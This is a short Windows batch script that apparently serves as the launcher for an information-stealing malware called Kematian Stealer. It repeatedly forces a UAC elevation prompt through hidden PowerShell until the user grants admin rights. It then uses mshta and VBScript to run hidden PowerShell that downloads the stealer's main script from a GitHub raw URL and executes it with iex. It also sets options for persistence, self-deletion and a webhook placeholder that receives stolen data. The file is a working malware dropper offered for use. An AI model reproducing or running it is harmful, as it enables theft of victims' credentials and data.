@echo off
cd /d "%~dp0"
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$webhook = 'YOUR_URL_HERE_SERVER';$debug = $false;$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $false;(iwr 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main.ps1' -UseB).Content -split [System.Environment]::NewLine | % { if ($i++ -ge 8) { $_ } } | iex",0))
